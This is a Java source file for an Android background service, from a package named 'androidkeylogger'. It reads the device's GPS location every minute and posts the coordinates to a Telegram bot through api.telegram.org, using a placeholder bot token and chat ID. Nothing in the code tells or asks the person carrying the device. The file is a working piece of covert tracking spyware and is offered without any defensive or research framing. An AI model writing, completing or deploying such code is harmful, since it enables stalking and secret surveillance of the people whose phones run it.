package com.bshu2.androidkeylogger;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class LocationService extends Service {

    private static final String TAG = "LocationService";
    private static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your bot token
    private static final String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // Replace with your chat ID
    private static final long LOCATION_INTERVAL = 60000; // 1 minute
    private LocationManager locationManager;
    private Timer timer;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "LocationService started");
        startLocationUpdates();
        startSendingLocationToTelegram();
    }

    private void startLocationUpdates() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
             ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)) {

            Log.e(TAG, "Location permissions are not granted");
            stopSelf(); // Stop the service if permissions are missing
            return;
        }

        locationManager.requestLocationUpdates(
            LocationManager.GPS_PROVIDER,
            LOCATION_INTERVAL,
            0,
            new LocationListener() {
                @Override
                public void onLocationChanged(@NonNull Location location) {
                    Log.d(TAG, "Location updated: " + location.getLatitude() + ", " + location.getLongitude());
                }

                @Override
                public void onStatusChanged(String provider, int status, android.os.Bundle extras) {
                }

                @Override
                public void onProviderEnabled(String provider) {
                }

                @Override
                public void onProviderDisabled(String provider) {
                    Log.e(TAG, "GPS disabled");
                }
            },
            Looper.getMainLooper()
        );
    }

    private void startSendingLocationToTelegram() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (ActivityCompat.checkSelfPermission(LocationService.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                    ActivityCompat.checkSelfPermission(LocationService.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    Log.e(TAG, "Location permissions are not granted");
                    stopSelf();
                    return;
                }

                Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastKnownLocation != null) {
                    double latitude = lastKnownLocation.getLatitude();
                    double longitude = lastKnownLocation.getLongitude();
                    sendLocationToTelegram(latitude, longitude);
                } else {
                    Log.d(TAG, "No location data available");
                }
            }
        }, 0, LOCATION_INTERVAL);
    }

    private void sendLocationToTelegram(double latitude, double longitude) {
        new Thread(() -> {
            try {
                String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                String message = "Location Update: Latitude = " + latitude + ", Longitude = " + longitude;

                URL url = new URL(telegramUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String postData = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + message;

                OutputStream outputStream = conn.getOutputStream();
                outputStream.write(postData.getBytes());
                outputStream.flush();
                outputStream.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Location sent to Telegram successfully");
                } else {
                    Log.e(TAG, "Failed to send location to Telegram, Response Code: " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "Error sending location to Telegram", e);
            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        if (locationManager != null) {
            locationManager.removeUpdates((LocationListener) null);
        }
        Log.d(TAG, "LocationService stopped");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // This is a started service, not a bound service
    }
}
